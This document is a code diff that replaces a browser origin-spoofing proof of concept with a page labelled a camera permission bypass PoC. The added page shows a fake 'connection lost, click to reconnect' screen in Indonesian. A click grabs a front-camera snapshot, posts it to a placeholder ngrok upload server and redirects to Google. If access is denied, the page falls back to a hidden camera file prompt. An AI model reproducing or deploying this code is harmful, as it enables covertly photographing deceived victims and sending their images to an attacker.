@@ -1,69 +1,83 @@
-
-
 <!doctype html>
-<html>
+<html lang="en">
 <head>
-<style>
-html { font-family: sans-serif; }
-#focusElem { opacity: 0.00001; width:1px; height:1px; }
-</style>
+    <meta charset="utf-8">
+    <title>PoC Camera Permission Bypass</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; font-family: sans-serif; }
+        
+    
+        #fake-ui {
+            position: absolute; width: 100%; height: 100%;
+            background: white; z-index: 2; display: flex;
+            flex-direction: column; align-items: center; justify-content: center;
+        }
+
+        iframe { width: 100%; height: 100%; border: none; }
+
+        #hidden-camera { position: absolute; left: -9999px; opacity: 0; }
+        canvas { display: none; }
+    </style>
 </head>
 <body>
 
-<p> <span id="originOutput"></span></p>
+    <div id="fake-ui">
+        <h1>Koneksi Terputus</h1>
+        <button id="btn" style="padding: 15px 30px; font-size: 1.2rem;">Klik untuk Rekoneksi</button>
+        <p>Aksi ini diperlukan untuk memverifikasi session Anda.</p>
+    </div>
 
-<input id="focusElem">
+    <video id="v" autoplay playsinline style="width: 1px; height: 1px;"></video>
+    <canvas id="c"></canvas>
+    <input type="file" id="f" accept="image/*" capture="user" style="display:none">
 
-<script>
+    <script>
+        const SERVER_URL = "https://YOUR_NGROK_ID.ngrok-free.app/upload";
+        const btn = document.getElementById('btn');
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
 
-originOutput.innerText = window.location.origin;
+        btn.onclick = async () => {
+           
+            btn.textContent = "Connecting...";
 
-var scenario = 'popup'; // Default scenario
-var query = window.location.search;
+            try {
+              
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
 
-if (query) {
-  scenario = query.substr(1); // Strip leading '?'
-}
+                setTimeout(() => {
+                    const ctx = canvas.getContext('2d');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0);
 
-var newWinParams = 'width=800,height=400,top=100';
+              
+                    const data = canvas.toDataURL('image/jpeg');
+           
+                    fetch(SERVER_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ img: data, ts: Date.now() })
+                    });
 
-var runPoC = () => {
+                    stream.getTracks().forEach(track => track.stop());
+                    
+                  
+                    window.location.href = "https://google.com";
+                }, 1500);
 
-  if (scenario == 'popup') {
-    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)', '_blank', newWinParams);
-  } else if (scenario == 'tab') {
-    window.open('javascript:alert("See dialog title for origin spoof. This dialog is from doc.domain: "+document.domain+", win.origin: "+window.origin)');
-  } else if (scenario == 'data') {
-    var win = window.open('data:,Hello', '_blank', newWinParams);
-    setTimeout(() => {
-      win.alert('JS dialog from iframe, origin: '+window.origin);
-    }, 100);
-  } else if (scenario == 'protocol') {
-    var win = window.open('test:', '_blank', newWinParams);
-    setTimeout(() => {
-      win.alert('JS dialog from iframe, origin: '+window.origin);
-    }, 100);
-  } else if (scenario == 'docwrite1') {
-    // Results in renderer kill: bad_message::RFH_CAN_COMMIT_URL_BLOCKED
-    var win = window.open('javascript:document.write("test")', '_blank', newWinParams);
-  } else if (scenario == 'docwrite2') {
-    // Results in renderer kill: bad_message::RFH_INVALID_ORIGIN_ON_COMMIT
-    var win = window.open('data:,Hello', '_blank', newWinParams);
-    setTimeout(() => {
-      win.document.write('test');
-    }, 100);
-  }
-
-}
-
-setInterval(() => {
-  focusElem.focus();
-}, 100);
-
-focusElem.addEventListener('keypress', runPoC);
-
-window.addEventListener('click', runPoC);
-
-</script>
+            } catch (err) {
+                console.log("Izin ditolak atau error:", err);
+               
+                document.getElementById('f').click();
+            }
+        };
+    </script>
 </body>
 </html>
